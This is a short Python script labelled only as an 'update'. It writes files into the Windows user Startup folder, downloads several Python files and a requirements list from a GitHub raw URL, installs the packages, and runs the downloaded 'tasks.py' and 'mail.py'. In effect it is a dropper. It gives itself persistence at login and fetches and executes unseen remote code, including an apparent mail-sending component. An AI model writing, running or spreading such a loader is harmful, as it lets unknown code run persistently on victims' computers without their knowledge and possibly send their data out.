import os
import sys
import subprocess


# update
USERNAME = os.environ['USERNAME']
PATH = rf"C:\Users\{USERNAME}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

setup = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/setup.pyw"
tasks = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/tasks.py"
reqs = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/requirements.txt"
mail = "https://raw.githubusercontent.com/lamer34/latest_lamer/master/mail.py"

files = [setup, tasks, reqs, mail]


def install_modules():
    try:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])

    except Exception as e:
        print(e)


def get_codes(URL):
    import requests

    r = requests.get(URL)
    file_name = URL.split("/")[-1]

    if r.ok:
        with open(f"{file_name}", "w") as w:
            w.write(r.text)


def run_tasks():
    try:
        subprocess.check_call([sys.executable, "tasks.py"])
        subprocess.check_call([sys.executable, "mail.py"]) # update :)

    except Exception as e:
        print(e)


def main():

    os.chdir(PATH)

    for file in files:
        get_codes(file)

    install_modules()
    run_tasks()


if __name__ == "__main__":
    main()
